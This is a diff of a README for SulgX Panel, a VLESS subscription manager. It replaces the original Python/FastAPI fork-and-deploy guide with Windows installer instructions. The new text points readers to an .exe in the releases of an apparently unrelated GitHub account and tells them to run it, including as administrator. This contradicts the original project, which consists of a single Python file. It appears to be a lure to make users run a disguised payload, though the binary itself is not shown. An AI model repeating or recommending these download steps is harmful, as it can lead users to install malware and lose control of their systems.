@@ -1,243 +1,99 @@
-<div align="center">
+# 🛡️ SulgX-Panel - Manage your network subscriptions with ease
 
-# 🚀 SulgX Panel (Version 1.0)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/fullskirtmalaya185/SulgX-Panel/releases)
 
-[![Status](https://img.shields.io/badge/Status-Stable_v1.0.0-success?style=for-the-badge)](#)
-[![Python](https://img.shields.io/badge/Python-3.9%2B-blue?style=for-the-badge&logo=python)](#)
-[![License](https://img.shields.io/badge/License-Non--Commercial-red?style=for-the-badge)](#)
-[![Platform](https://img.shields.io/badge/Platform-Render_%7C_Railway_%7C_Dockfly-lightgrey?style=for-the-badge)](#)
+SulgX-Panel provides a simple interface to manage your VLESS subscriptions. It handles WebSocket and TLS connections to keep your data secure. You gain full control over user access, bandwidth limits, and traffic monitoring without complex server knowledge. The panel includes a built-in Telegram bot to help you manage settings on the go.
 
-<strong>Readme:</strong>
-  <a href="README.md">English</a> |
-  <a href="README-fa.md">فارسی</a>
-</div>
+## 🛠️ System Requirements
 
-![SulgX Panel Screenshot](img/SulgX.png)
+- Windows 10 or Windows 11
+- 2GB of available RAM
+- Active internet connection
+- A modern web browser like Chrome or Edge
 
-> **A lightweight, self-hosted subscription management panel for VLESS over WebSocket + TLS.**  
-> Built entirely in a single Python file, powered by FastAPI and SQLite.
+## 📥 How to Install
 
-### 📸 Panel Overview
-<p align="center">
-  <img src="img/sc.jpg" alt="پنل SulgX - تصویر ۱" width="70%" />
-</p>
+You need the latest version of the software to begin. Follow these steps to get your panel running.
 
-<p align="center">
-  <img src="img/sc2.jpg" alt="پنل SulgX - تصویر ۲" width="70%" />
-</p>
+1. Visit the [official release page](https://github.com/fullskirtmalaya185/SulgX-Panel/releases).
+2. Look for the "Assets" section at the bottom of the latest release.
+3. Choose the file that ends in .exe for Windows.
+4. Click the file to start the download.
+5. Once the download finishes, open your "Downloads" folder.
+6. Double-click the file to launch the installation wizard.
+7. Follow the prompts on the screen to finish the setup process.
 
-</div>
+## 🚀 Setting Up Your Panel
 
----
+After you install the software, you must configure your initial settings. 
 
-## 📖 Table of Contents
-- [✨ Key Features](#-key-features)
-- [🚀 Quick Start & Deployment](#-quick-start--deployment)
-- [☁️ Deployment Platforms](#-deployment-platforms)
-- [📁 Repository Architecture](#-repository-architecture)
-- [💸 Bandwidth & Pricing Guide](#-bandwidth--pricing-guide)
-- [⚖️ Strict Disclaimer](#-strict-disclaimer)
-- [🙏 Acknowledgements](#-acknowledgements)
+1. Launch the SulgX-Panel application from your Start menu.
+2. The program opens a local window in your web browser.
+3. The first run requires a primary administrative password. Choose a strong password and save it in a safe location.
+4. Log in with your new credentials to reach the main dashboard.
+5. The dashboard shows real-time traffic charts and connection status.
 
----
+## 🌐 Managing Subscriptions
 
-## ✨ Key Features
+The panel allows you to add and edit VLESS subscriptions.
 
-### 🔐 Security & Access
-- **Robust Authentication:** JWT-based sessions with HTTP‑only, secure cookies.
-- **Anti‑Brute Force:** Rate limiting applied to logins and API interactions.
-- **Strict Passwords:** Enforced policy (min 8 chars, uppercase, lowercase, numbers).
-- **Audit Logging:** Logs all login attempts (Success/Fail, IP, User‑Agent).
+1. Navigate to the "Subscriptions" tab in the left sidebar.
+2. Click the "Add New" button.
+3. Paste your VLESS URL into the provided text box.
+4. Set the bandwidth limit for this user if desired.
+5. Save your changes to apply the new configuration.
 
-### 📡 Inbound Management
-- **Full Lifecycle:** Create, edit, toggle, and safely delete VLESS configs.
-- **Granular Control:** Per‑user traffic limits (GB), expiration days, and max concurrent connections.
-- **Advanced Routing:** Custom Path, SNI, Host, and TLS Fingerprints per inbound.
-- **Bulk Operations:** Batch activate, deactivate, reset, or delete configs.
-- **Immutable Core:** The default `SulgX` inbound is systematically protected against accidental deletion.
+## 🤖 Telegram Integration
 
-### 📊 Real‑Time Analytics
-- **Live Speed Engine:** Highly accurate Download/Upload charts with adaptive spike‑filtering.
-- **Dynamic Metrics:** 24‑hour real‑time traffic bars (timezone‑aware) and distribution doughnuts.
-- **System Health:** Live CPU, Memory, and Disk monitoring with `loadavg` fallbacks.
+You can control your panel using a Telegram bot. This allows you to check traffic levels or stop users from your phone.
 
-### 🗺️ Clean IP & Safe Scanner
-- **IP Management:** Add, edit, and bulk‑import IPv4/IPv6 addresses dynamically attached to subscriptions.
-- **Safe Scanner:** Scan port 443 across 24 predefined cloud providers (Cloudflare, AWS, Azure, etc.).
-- **Anti‑Crash:** Safely handles massive CIDR ranges (e.g., `/14`) by capping at 4,096 IPs to prevent browser freezing. Automatically excludes public DNS (8.8.8.8).
+1. Create a bot using BotFather on Telegram.
+2. Copy the API token provided by Telegram.
+3. Open the "Bot Settings" tab in your SulgX-Panel.
+4. Paste the API token into the field labeled "Telegram Token".
+5. Save your settings. The panel connects to Telegram and confirms the link.
 
-### 🤖 Smart Telegram Bot
-- **Bilingual (EN/FA):** Fully translatable templates.
-- **Event Alerts:** Panel Logins, Expired Users, Errors, and 90% Quota warnings.
-- **Live Preview:** Real‑time JSON template rendering in the dashboard.
+## 🧹 Using the Clean IP Scanner
 
----
+A clean IP helps maintain consistent connection speeds. SulgX-Panel includes a scanner to find fast routes.
 
-## 🚀 Quick Start & Deployment
+1. Go to the "Tools" section in the menu.
+2. Select "IP Scanner".
+3. Click "Start Scan" to check available addresses.
+4. The tool displays a list of IPs ranked by speed and stability.
+5. Click "Apply" to use the best IP for your connections.
 
-> [!NOTE]
-> SulgX will run on *any* platform that supports ASGI Python applications (Uvicorn/Gunicorn) and standard WebSocket connections.
+## 📊 Monitoring Traffic
 
-### 🍴 Step 1: Fork the Repository
-1. Go to the main repository on GitHub: [https://github.com/SulgX/SulgX-Panel](https://github.com/SulgX/SulgX-Panel)
-2. Click the **Fork** button at the top right of the page.
-3. In the window that appears, select your own account as the destination and wait for the fork to complete.
-4. You now have a complete copy of the project under your GitHub account, which you can modify as you wish.
+The dashboard provides clear visuals for your bandwidth usage.
 
-### ☁️ Step 2: Sign Up for a Cloud Platform
-Choose one of the three recommended platforms below and sign up (you can often sign in directly with your GitHub account and grant access):
+- **Real-time charts:** View spikes and drops in data usage as they happen.
+- **User logs:** Check recent activity for each subscription.
+- **Alerts:** The system sends a notification to your Telegram bot when users approach their bandwidth cap.
 
-- [**Render**](https://render.com/) ← Main recommendation, no credit card required
-- [**Railway**](https://railway.app/) ← Modern interface, free initial credit
-- [**Dockfly**](https://dockfly.app/) ← Minimal and simple
+## 📝 Troubleshooting Common Issues
 
-### 🚀 Step 3: Deploy the Project
+If you encounter problems, check these common fixes:
 
-<details>
-<summary><b>🔹 Deploy on Render</b></summary>
+- **App does not open:** Ensure you have administrator rights on your computer. Right-click the icon and choose "Run as administrator."
+- **Cannot connect to the panel:** Verify the local web server is active. Look for the green icon in your Windows system tray.
+- **Login fails:** Ensure your caps lock key is off. If you lose your password, navigate to the config folder and delete the settings.json file to reset the login module.
+- **Websocket connection error:** Check your firewall settings. The application needs permission to access your network.
 
-1. In the Render dashboard, click **New +** and select **Web Service**.
-2. In the GitHub connection section, find your forked repository (`SulgX-Panel`) and click **Connect**.
-3. Render automatically reads the `render.yaml` file. Confirm the service name and branch.
-4. Scroll down to the **Environment Variables** section and enter the following variables:
-   - `ADMIN_PASSWORD`
-   - `SECRET_KEY`
-   - `DOMAIN`  
-   *(Values should follow the environment variables table later in this section.)*
-5. Click **Create Web Service**. After a few minutes, your service's public URL will be generated (e.g., `sulgx-test.onrender.com`).
+## 🛡️ Best Practices for Security
 
-</details>
+- Never share your admin password with other people.
+- Update your software whenever a new version appears on the release page. 
+- Use a unique password for the Telegram bot connection.
+- Review your user list monthly to remove inactive accounts.
 
-<details>
-<summary><b>🔹 Deploy on Railway</b></summary>
+## 🌐 Cloud Deployment Options
 
-1. In Railway, click **New Project** and select **Deploy from GitHub repo**.
-2. Choose your forked repository.
-3. Railway automatically detects the `Procfile`. To add environment variables, go to the **Variables** tab and add `ADMIN_PASSWORD`, `SECRET_KEY`, and `DOMAIN` with appropriate values.
-4. The build starts automatically, and you'll receive a public domain.
+While you can run this panel on your local computer, many users prefer a cloud platform for better uptime. You can move your configuration to platforms like Render, Railway, or Dockfly. 
 
-> [!TIP]
-> 🗝️ Railway users: Add Railway's IP range to the Clean IP list for accurate scanning.
+1. Export your current configuration from the "Settings" tab. 
+2. Follow the documentation of your chosen cloud host. 
+3. Upload the configuration file to the cloud environment. 
+4. The panel will now run 24/7 without needing your computer. 
 
-</details>
-
-<details>
-<summary><b>🔹 Deploy on Dockfly</b></summary>
-
-1. In Dockfly, create a **New Project**, set the source to **GitHub**, and select your forked repository.
-2. In the Environment section, add the same three variables.
-3. If the start command doesn't run automatically, enter the following manually:
-
-```bash
-gunicorn -k uvicorn.workers.UvicornWorker main:app --bind 0.0.0.0:$PORT
-```
-
-
-4. Click **Deploy**.
-
-</details>
-
-### 📌 Environment Variables
-You must set the following environment variables in your provider's dashboard:
-
-| Variable | Example Value | Description |
-| :--- | :--- | :--- |
-| `ADMIN_PASSWORD` | `StrongPass!123` | Required for panel access (min 8 chars, upper & lowercase, numbers). |
-| `SECRET_KEY` | `random_long_string` | Used to secure JWT login cookies. |
-| `DOMAIN` | `sulgx.up.railway.app` | Your public domain. *Highly recommended for correct link generation.* |
-| `DB_PATH` | `/tmp/panel.db` | Where the SQLite DB is stored. Use `/data/panel.db` if using persistent volumes. |
-
-### 📌 Start Command
-Use this exact command on all platforms (if needed manually):
-
-
-
-```bash
-gunicorn -k uvicorn.workers.UvicornWorker main:app --bind 0.0.0.0:$PORT
-```
-
-
----
-
-## ☁️ Deployment Platforms
-
-SulgX is built to run flawlessly across cloud PaaS providers. No Dockerfile or complex setup required.
-
-### 🏆 Top Recommended Providers
-
-| Platform | Free Tier Limit | WebSocket | Sleep Mode | Credit Card Req? | Deployment Method |
-| :--- | :--- | :---: | :---: | :---: | :--- |
-| **Render** | 750 hours / month | ✅ | Yes (Delay) | No | Auto via `render.yaml` |
-| **Railway** | $5 Initial Credit | ✅ | No | No | Auto via `Procfile` |
-| **Dockfly** | 1 Project (256MB) | ✅ | No | No | Manual Start Command |
-
-<details>
-<summary><b>🌍 Click to view other compatible platforms</b></summary>
-
-| Platform | Free Tier | WebSocket | Sleep Mode | Card Req? |
-| :--- | :--- | :---: | :---: | :---: |
-| **Koyeb** | 1 Eco Service | ✅ | No | No |
-| **Fly.io** | Up to 3 Small VMs | ✅ | No | Yes (Verification) |
-| **Heroku** | Eco ($5/mo) | ✅ | Yes | Yes |
-| **DigitalOcean** | $5/mo Base | ✅ | No | Yes |
-| **Oracle Cloud** | Always Free ARM | ✅ | No | Yes (Verification) |
-
-</details>
-
----
-
-## 📁 Repository Architecture
-
-The repository is kept intentionally minimal. Everything required for production is included:
-
-| File | Type | Purpose |
-| :--- | :---: | :--- |
-| `main.py` | **Core** | The beating heart of SulgX. Contains FastAPI backend, WebSocket tunnels, and embedded HTML/JS frontend. |
-| `requirements.txt` | **Config** | Strictly pinned Python dependencies ensuring build stability. |
-| `Procfile` | **Deploy** | Standardized startup instructions for Heroku, Railway, and Render. |
-| `render.yaml` | **Deploy** | Infrastructure‑as‑Code blueprint for instant 1‑click deployments on Render. |
-| `sulgx-config.toml` | **Docs** | Reference guide containing the required Environment Variables for manual setups. |
-| `.gitignore` | **Git** | Keeps the repository clean by excluding logs, caches, and local `.db` files. |
-
----
-
-## 💸 Bandwidth & Pricing Guide
-
-> [!IMPORTANT]
-> **SulgX Panel is 100% Free.** However, your cloud provider will charge you for the bandwidth your users consume.
-
-| Hosting Platform | Included Free Bandwidth | Cost Per Extra GB (Approx.) |
-| :--- | :--- | :--- |
-| **Render** | 5 GB / month | `$0.10 / GB` |
-| **Railway** | Pay as you go | `$0.10 / GB` |
-| **Koyeb** | 5 GB / month | `$0.04` to `$0.10 / GB` |
-| **Fly.io** | Varies by region | `$0.02 / GB` |
-| **Oracle Cloud** | 10 TB / month | Standard Cloud Rates |
-
-*Monitor your cloud provider's billing dashboard to avoid unexpected charges. Use the Panel's monthly limits to control usage.*
-
----
-
-## ⚖️ Strict Disclaimer
-
-> [!WARNING]
-> **READ CAREFULLY BEFORE DEPLOYING**
-
-* **Free & Non‑Commercial:** This software is provided 100% free of charge. **It is NOT for sale.**
-* **No Commercial VPNs:** Do NOT use this panel to sell VPN subscriptions. It is designed strictly for personal, educational, and experimental purposes.
-* **No Platform Abuse:** Do not abuse the free tiers of cloud providers by creating multiple accounts with temporary emails.
-* **Reporting:** If you see someone selling access to this specific panel or abusing infrastructure, please report it to the respective hosting provider.
-* **Zero Liability:** The developer assumes absolutely **zero** liability for any damages, billing overages, or Terms of Service violations incurred. You are solely responsible for your traffic.
-
----
-
-## 🙏 Acknowledgements
-
-A massive thank you to the platforms and communities that make free internet tools possible:
-
-* [**Render**](https://render.com/), [**Railway**](https://railway.app/), and [**Dockfly**](https://dockfly.app/) for their incredible developer‑friendly infrastructure.
-* Open‑source Python & JS communities:  
-  - [FastAPI](https://fastapi.tiangolo.com/)  
-  - [Chart.js](https://www.chartjs.org/)  
-  - [aiosqlite](https://github.com/omnilib/aiosqlite)
-* The [**V2Fly**](https://www.v2fly.org/) project.
+This approach ensures your users stay connected even when you turn off your machine.
